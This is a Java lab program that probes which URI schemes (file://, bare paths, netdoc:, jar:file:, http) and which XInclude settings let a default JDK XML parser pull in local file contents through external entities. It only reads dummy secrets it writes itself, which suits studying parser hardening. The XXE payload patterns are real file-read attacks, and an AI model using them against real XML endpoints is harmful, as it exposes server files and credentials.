/*
 * §4.1, §4.3 - which system identifiers a stock JDK DocumentBuilderFactory resolves.
 * Authorised lab use only; reads only files this program's PHP sibling created.
 *
 *   javac XxeSchemes.java && java XxeSchemes
 */
import javax.xml.parsers.*;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;
import java.io.*;
import java.util.zip.*;

public class XxeSchemes {

    static String dir;

    static void t(String label, String sysid) {
        String xml = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"" + sysid + "\">]><r>&xxe;</r>";
        try {
            DocumentBuilder b = DocumentBuilderFactory.newInstance().newDocumentBuilder();
            b.setErrorHandler(null);
            Document d = b.parse(new InputSource(new StringReader(xml)));
            String out = d.getDocumentElement().getTextContent().trim().replace("\n", "\\n");
            System.out.printf("%-42s => %s%n", label, out.isEmpty() ? "(empty)" : out.substring(0, Math.min(60, out.length())));
        } catch (Exception e) {
            String m = String.valueOf(e.getMessage()).replace("\n", " ");
            System.out.printf("%-42s => %s: %s%n", label, e.getClass().getSimpleName(), m.substring(0, Math.min(60, m.length())));
        }
    }

    static void xinclude(boolean aware) {
        String xml = "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
                   + "<xi:include parse=\"text\" href=\"" + dir + "/secret.txt\"/></root>";
        try {
            DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
            f.setNamespaceAware(true);
            f.setXIncludeAware(aware);
            DocumentBuilder b = f.newDocumentBuilder();
            b.setErrorHandler(null);
            String out = b.parse(new InputSource(new StringReader(xml)))
                          .getDocumentElement().getTextContent().trim().replace("\n", "\\n");
            System.out.printf("%-42s => %s%n", "XIncludeAware=" + aware + ", bare path", out.isEmpty() ? "(nothing)" : out);
        } catch (Exception e) {
            System.out.printf("%-42s => %s%n", "XIncludeAware=" + aware, e.getClass().getSimpleName());
        }
    }

    public static void main(String[] a) throws Exception {
        dir = new File("tmp").getAbsolutePath();
        new File(dir).mkdirs();
        try (Writer w = new FileWriter(dir + "/secret.txt")) {
            w.write("SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd\n");
        }
        try (ZipOutputStream z = new ZipOutputStream(new FileOutputStream(dir + "/bundle.zip"))) {
            z.putNextEntry(new ZipEntry("conf/db.txt"));
            z.write("ZIP-ENTRY: password=s3cr3t".getBytes());
            z.closeEntry();
        }

        System.out.println("Java " + System.getProperty("java.version"));
        System.out.println();
        t("file:// (baseline)",           "file://" + dir + "/secret.txt");
        t("bare absolute path",           dir + "/secret.txt");
        t("bare relative path",           "tmp/secret.txt");
        t("netdoc:  (removed in JDK 9)",  "netdoc:" + dir + "/secret.txt");
        t("jar:file:...!/entry",          "jar:file://" + dir + "/bundle.zip!/conf/db.txt");
        t("http:// closed port",          "http://127.0.0.1:9/x");
        System.out.println();
        xinclude(false);
        xinclude(true);
    }
}
